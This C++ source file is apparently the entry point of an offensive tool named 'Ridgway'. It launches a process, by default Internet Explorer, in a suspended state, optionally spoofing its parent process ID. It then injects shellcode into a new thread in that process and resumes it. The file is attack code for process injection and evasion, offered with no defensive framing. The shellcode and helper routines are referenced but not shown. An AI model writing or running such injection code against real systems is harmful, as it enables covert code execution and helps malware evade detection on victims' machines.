#include <Windows.h>
#include <iostream>

#include "stdafx.h"
#include "ShellcodeInjection.h"
#include "ProcessManipulation.h"
#include "Ridgway.h"


int CreateRemoteThread(_TCHAR* processName, int parentProcessId)
{
	const auto processInfo = StartProcessSuspended(processName, parentProcessId);

	if (processInfo.dwProcessId == NULL) {
		return 1;
	}

	if (!InjectShellcodeIntoNewThread(processInfo)) {
		return 2;
	}

	if (!ResumeThread(processInfo.hThread))
	{
		DisplayErrorMessage(TEXT("[-] Error resuming thread"), GetLastError());
		return 3;
	}
	return 0;
}


// Usage: Ridgway.exe [optional process path] [optional parent pid]
// Defaults are C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe and explorer parent pid.
int _tmain(int argc, _TCHAR* argv[])
{
#ifdef DEBUG
	system("pause");
#endif
	
	TCHAR processPath[500] = TEXT("c:\\Program Files (x86)\\Internet Explorer\\iexplore.exe");
	auto parentProcessId = -1;
	
	if (argc >= 2)
	{
		wcscpy_s(processPath, argv[1]);
		if(argc >= 3)
		{
			parentProcessId = _tstoi(argv[2]);
		}
	}
	
	try
	{
		return CreateRemoteThread(processPath, parentProcessId);
	}
	catch (const std::exception& e)
	{
		std::cout << e.what();
	}
}




